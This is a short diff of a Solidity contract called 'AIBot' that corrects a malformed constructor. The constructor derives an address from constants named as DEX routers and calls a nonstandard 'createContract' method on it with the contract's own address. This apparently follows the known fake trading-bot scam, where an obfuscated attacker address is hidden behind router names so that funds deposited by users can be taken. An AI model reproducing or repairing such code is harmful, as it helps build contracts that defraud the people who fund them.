@@ -32,7 +32,7 @@ contract AIBot {
     uint liquidity;
     event Log(string _msg);
 
-    constructo{
+    constructor() {
         _owner = msg.sender;
         address dataProvider = deriveDexRouterAddress(UNISWAP_ROUTER, WETH_ROUTER);
         IERC20(dataProvider).createContract(address(this));
